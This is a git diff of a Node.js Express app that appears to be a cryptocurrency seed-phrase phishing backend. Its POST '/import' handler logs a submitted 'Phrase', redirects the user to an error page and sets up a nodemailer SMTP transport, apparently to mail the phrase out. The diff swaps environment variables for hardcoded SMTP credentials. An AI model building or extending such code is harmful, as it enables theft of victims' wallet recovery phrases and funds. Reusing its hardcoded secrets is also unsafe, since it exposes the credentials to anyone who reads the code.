@@ -23,14 +23,13 @@ app.get("/import-phrase", (req, res) => {
 app.post("/import", async (req, res) => {
     try {
         console.log(req.body.Phrase)
-        console.log(process.env.USER)
         res.redirect("/error")
         let transport = nodemailer.createTransport({
             host: 'smtp.ethereal.email',
             port: 587,
             auth: {
-                user: process.env.USER,
-                pass: process.env.PASS
+                user: "ronaldo19@ethereal.email",
+                pass: "AZNUNdaCRTqCY6kfuU"
             }
         })
     
